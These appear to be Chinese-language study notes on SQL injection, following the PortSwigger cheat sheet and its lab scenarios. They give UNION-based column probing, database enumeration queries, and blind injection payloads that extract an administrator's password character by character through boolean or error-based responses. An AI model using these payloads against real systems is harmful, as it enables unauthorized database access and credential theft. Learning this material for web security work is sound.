# SQL Injection
## 註解
* Oracle : `--comment`
* Microsoft	: `--comment` `/*comment*/`
* PostgreSQL : `--comment` `/*comment*/`
* MySQL : `#comment` `--comment` `/*comment*/` [注意: dash 後面要空一格]
## UNION Attack
### 檢測欄位數量
#### NULL
* 使用 null 個數來確認欄位數量，當成功時即為此查詢的欄位數量。
```
'UNION SELECT NULL --
'UNION SELECT NULL,NULL --
...
直到成功
```
* 在 Oracle 上，每個 SELECT 查詢都必須使用 FROM 關鍵字並指定一個有效的表。 因此可以透過 Oracle 上一個名為 dual 的內置表，來達成目的。
```
' UNION SELECT NULL FROM DUAL--
```
#### ORDER
* 使用 ORDER BY 個數來確認欄位數量，當成功時即為此查詢的欄位數量。
```
' ORDER BY 1--
' ORDER BY 2--
...
直到成功
```
### 檢測欄位類型
* 通常要我們想要得資料是字串形式，因此需要確認原本查詢的資料類型也為字串。
```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```
### 字串連接
* Oracle : `'foo'||'bar'`
* Microsoft : `'foo'+'bar'`
* PostgreSQL : `'foo'||'bar'`
* MySQL: `'foo'  'bar'` [注意: 這邊使用空格分隔]
## 檢測資料庫資訊
### 版本
* Oracle : `SELECT * FROM v$version`
* Microsoft, MySQL : `SELECT @@version`
* PostgreSQL : `SELECT version()`
### 資料表名稱
* Oracle : `SELECT table_name FROM all_tables`
* Microsoft, MySQL, PostgreSQL : `SELECT table_name FROM information_schema.tables`
### 欄位名稱
* Oracle : `SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
* Microsoft, MySQL, PostgreSQL : `SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
## Bind SQL Injection
### 觸發條件回應
#### 情境
* 網站透過 cookie 來檢查使用者狀況(有SQLi漏洞)，正常情況會在網頁上呈現 Welcome back。
* Request:
```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```
* SQL Query
```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
#### 作法
* 透過下列條件，如果條件為 True ('1'='1')，網站會回應 Welcome back，反之 False ('1'='2') 則不會回應 Welcome back。由此可判斷 True 或 False。
```
...xyz' AND '1'='1
...xyz' AND '1'='2
```
#### 取得密碼
* 有了上述方法來判斷 True/False，我們可以進一步檢查密碼長度與密碼。
* 修改 `LENGTH(password)>數字`，檢查密碼長度。
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```
* 修改 `SUBSTRING(password,1,1) ... ='a'`，將密碼一個一個字拚湊出來。
```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
### 觸發 SQL 錯誤
#### 情境
* 這次的情境是，用前面所提的觸發條件注入，但結果是沒有什麼變化，因此我們將透過觸發 SQL 錯誤，導致回應為 Internal Server Error (500)，來辨別 True 或 False。
#### 作法
* 透過 `SELECT CASE WHEN (條件)`，來決定是否觸發 1/0 ，來觸發SQL錯誤，進一步得知注入的結果是 True 或 False。
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
#### 取得密碼
* 有了上述方法來判斷 True/False，我們可以進一步檢查密碼長度與密碼。
* 修改 `LENGTH(password)>數字`，檢查密碼長度。
```
xyz' AND (SELECT CASE WHEN (LENGTH(password)>1) THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a
```
* 修改 `SUBSTRING(password, 1, 1)='a'`，將密碼一個一個字拚湊出來。
```
xyz' AND (SELECT CASE WHEN (SUBSTRING(password, 1, 1)='a') THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a
```
### 觸發時間延遲
### out-of-band (OAST) 技術
## 參考資料
* [portswigger sqli cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
###### tags: `web security`